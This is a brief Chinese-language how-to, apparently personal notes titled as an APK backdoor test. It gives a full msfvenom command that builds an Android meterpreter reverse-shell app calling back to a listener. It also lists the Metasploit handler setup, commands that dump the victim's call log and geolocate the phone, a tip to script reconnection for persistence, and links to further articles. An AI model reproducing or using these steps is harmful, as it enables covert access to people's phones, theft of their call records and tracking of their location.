# Apk后门测试

创建apk  
`msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.3.212 lport=25555 R > /root/123.apk`  
安装，需要把权限开全，比如位置信息

服务端:

1. `use exploit/multi/handler`
2. `set payload android/meterpreter/reverse_tcp`
3. `set lhost 192.168.3.212`
4. `set lport 25555`
5. `exploit`
6. `dump_calllog`通话记录
7. `geolocate`定位

这个隔一会就会断开，需要建立连接后写个sh的脚本，每隔一段时间就做一下

```txt
https://www.cnblogs.com/zilong666/p/8430130.html  
https://www.freebuf.com/articles/terminal/107801.html  
https://www.freebuf.com/articles/terminal/116924.html  
https://www.freebuf.com/articles/terminal/133357.html  
```